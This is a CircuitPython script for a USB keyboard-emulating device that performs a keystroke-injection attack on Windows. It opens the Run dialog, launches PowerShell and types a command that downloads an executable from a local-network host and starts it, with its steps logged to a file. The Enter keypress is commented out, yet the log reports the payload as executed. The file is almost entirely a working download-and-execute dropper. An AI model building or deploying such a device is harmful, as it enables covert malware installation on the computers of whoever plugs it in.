import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayout
from adafruit_hid.keycode import Keycode

# Logging function
def log_message(message):
    try:
        with open("/log.txt", "a") as log_file:
            log_file.write(f"{message}\n")
    except Exception as e:
        pass  # Silent fail if logging isn't possible

# Initialize logging
log_message("=== Script execution initiated ===")

# Create keyboard objects
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

log_message("HID keyboard interface initialized")

time.sleep(5)
log_message("Initial 5-second delay completed")

# Open Run dialog
log_message("Invoking Run dialog (Win + R)")
keyboard.press(Keycode.WINDOWS, Keycode.R)
keyboard.release_all()

time.sleep(0.5)

# Launch PowerShell
layout.write("powershell")
keyboard.press(Keycode.ENTER)
keyboard.release_all()
log_message("PowerShell launched")

time.sleep(1)

# Download and execute payload
command = "Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe"
layout.write(command)
log_message("Entered command on powershell")
# keyboard.press(Keycode.ENTER)
keyboard.release_all()
log_message("Command executed payload")

log_message("=== Script execution finalized ===")
keyboard.release_all()
